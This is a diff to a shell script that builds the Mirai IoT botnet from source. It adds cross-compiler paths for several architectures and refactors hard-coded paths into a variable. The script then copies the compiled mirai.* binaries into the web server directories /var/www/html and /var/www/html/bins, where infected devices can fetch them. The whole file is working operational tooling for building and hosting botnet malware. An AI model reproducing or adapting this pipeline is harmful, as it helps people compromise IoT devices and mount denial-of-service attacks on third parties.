@@ -3,10 +3,15 @@ clear
 echo Set Environment Variable
 echo -------------------------------------------------------
 
-#Execute these in your ssh terminal, this will add to your ~/.bashrc
+# setting path to Mirai source Folder
+pathToMirai=/home/kali/Desktop/myMirai/MiraiSourceCode
+export pathToMirai
+
+# Execute these in your ssh terminal, this will add to your ~/.bashrc
 echo $PATH
 export PATH=$PATH:/etc/xcompile/armv4l/bin
 export PATH=$PATH:/etc/xcompile/armv6l/bin
+export PATH=$PATH:/etc/xcompile/armv7l/bin
 export PATH=$PATH:/etc/xcompile/i586/bin
 export PATH=$PATH:/etc/xcompile/m68k/bin
 export PATH=$PATH:/etc/xcompile/mips/bin
@@ -15,7 +20,6 @@ export PATH=$PATH:/etc/xcompile/powerpc/bin
 export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
 export PATH=$PATH:/etc/xcompile/sh4/bin
 export PATH=$PATH:/etc/xcompile/sparc/bin
-export PATH=$PATH:/etc/xcompile/armv6l/bin
  
 export PATH=$PATH:/usr/local/go/bin
 export GOPATH=$HOME/go
@@ -28,13 +32,13 @@ echo Create release executable
 printf "\n"
 echo -------------------------------------------------------
 printf "\n"
-sudo chmod -R 777 /home/kali/Desktop/myMirai/MiraiSourceCode
-cd /home/kali/Desktop/myMirai/MiraiSourceCode/mirai
+sudo chmod -R 777 $pathToMirai
+cd $pathToMirai/mirai
 printf "\n"
 echo -------------------------------------------------------
 printf "\n"
 echo MOVING PROMPT.TXT
-mv /home/kali/Desktop/myMirai/MiraiSourceCode/mirai/release/prompt.txt /home/kali/Desktop/myMirai/MiraiSourceCode/mirai/prompt.txt
+mv $pathToMirai/mirai/release/prompt.txt $pathToMirai/mirai/prompt.txt
 printf "\n"
 echo -------------------------------------------------------
 printf "\n"
@@ -51,10 +55,10 @@ echo -------------------------------------------------------
 printf "\n"
 echo Copy executable on server
 sleep 2
-sudo cp /home/kali/Desktop/myMirai/MiraiSourceCode/mirai/release/mirai.* /var/www/html
-sudo cp /home/kali/Desktop/myMirai/MiraiSourceCode/mirai/release/mirai.* /var/www/html/bins
-sudo chmod -R 777 /home/kali/Desktop/myMirai/MiraiSourceCode
-mv /home/kali/Desktop/myMirai/MiraiSourceCode/mirai/prompt.txt /home/kali/Desktop/myMirai/MiraiSourceCode/mirai/release/prompt.txt
+sudo cp $pathToMirai/mirai/release/mirai.* /var/www/html
+sudo cp $pathToMirai/mirai/release/mirai.* /var/www/html/bins
+sudo chmod -R 777 $pathToMirai
+mv $pathToMirai/mirai/prompt.txt $pathToMirai/mirai/release/prompt.txt
 printf "\n\n"
 echo ----------------------------------------------------
 read -n 1 -s -r -p "Press any key to continue"
